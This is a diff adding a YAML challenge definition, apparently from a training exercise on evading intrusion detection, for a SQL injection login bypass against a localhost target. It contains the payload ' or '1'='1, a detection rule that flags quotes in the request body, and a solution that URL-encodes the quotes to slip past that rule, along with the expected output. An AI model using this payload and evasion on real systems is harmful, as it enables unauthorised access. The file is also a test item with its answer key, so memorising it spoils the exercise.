@@ -1,0 +1,36 @@
+name: 'SQL Injection (Login) 1'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  **Goal: Log in**
+
+hints: []
+
+target: hidden-reports
+
+base_request: |-
+  POST / HTTP/1.1
+  Host: localhost
+
+  passphrase=' or '1'='1
+
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Content-Length: 30
+  Content-Type: application/x-www-form-urlencoded
+
+  passphrase=%27 or %271%27=%271
+
+solution_note: URL Encoding
+
+rules:
+
+# URL encoding
+- >
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "passphrase="; content: "'"; sid:123456; rev:1;)
+
+expected_output: "TOP SECRET"
